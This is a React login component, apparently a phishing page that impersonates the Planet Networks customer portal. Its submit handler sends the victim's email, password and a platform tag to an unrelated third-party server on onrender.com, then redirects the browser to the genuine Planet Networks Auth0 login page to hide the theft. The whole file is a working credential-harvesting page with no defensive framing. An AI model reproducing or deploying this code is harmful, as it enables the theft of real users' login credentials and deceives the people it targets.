import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';
import logo from './logo.png';
import google from './google.png';
import rounde from './round.png';
import aptlogo from './apt_logo.png';
import planet from './planet.png';



function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Planet")

    const[showError, setShowError] = useState(false);

    const[ischecked, setChecked] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            window.location.href = 'https://fibersmith-planetnetworks.us.auth0.com/login?state=hKFo2SBlTzBYeFQ1N2lLNUZ4c1dGZ3M3SG9mdXlHQ2FvUVhBRqFupWxvZ2luo3RpZNkgN2xLNF9LcDV2V25CYVloMEV4elU0STNVSlhLc3BwWDWjY2lk2SB4R2FUWUsybUtaQVhsVVd1UU9QRDRoY0dWUTF5VUpiVw&client=xGaTYK2mKZAXlUWuQOPD4hcGVQ1yUJbW&protocol=oauth2&response_type=token%20id_token&redirect_uri=https%3A%2F%2Fmy.planet.net%2Fcallback&scope=openid%20profile%20token%20token_id&audience=https%3A%2F%2Fplanetnetworksportalapi.fibersmith.systems%2F&nonce=AKpL3AS8.AYERmXfcgFUV44fd_Bf80wi&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4yMy4zIn0%3D';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}


    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='col-md-3 whitediv m-auto'>
                <div className='imagediv py-4 px-0 text-center'>
                <img className='logoimage' src={planet} />

                </div>



                <form onSubmit={handleSubmit}>

     

    
  <div class="input-group  px-3">
    <div class="input-group-prepend mt-2">
      <div class="input-group-text"><i className='fa fa-user icons'></i></div>
    </div>
    <input onChange={function(e){
      setUserName(e.target.value);
    }}value={email} type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="username/email"required/>
  </div>



  <div class="input-group  px-3 mt-2">
    <div class="input-group-prepend mt-2">
      <div class="input-group-text"><i className='fa fa-lock icons'></i></div>
    </div>
    <input onChange={function(e){
      setPassword(e.target.value);
    }}value={password} type="password" class="form-control" id="inlineFormInputGroupUsername2" placeholder="your password"required/>
  </div>


<div className='text-center py-4'>
<a className='forgot'>Don't remember your password?</a>

</div>
    
       
                   
                 <div className='form-group text-center'>

                        <button type='submit' className='btn btn-rounded-bottom mybutton '>{'LOG IN >'}</button>

                    </div>

                </form>

            </div>


          
        
        </>
    );
}

export default Home;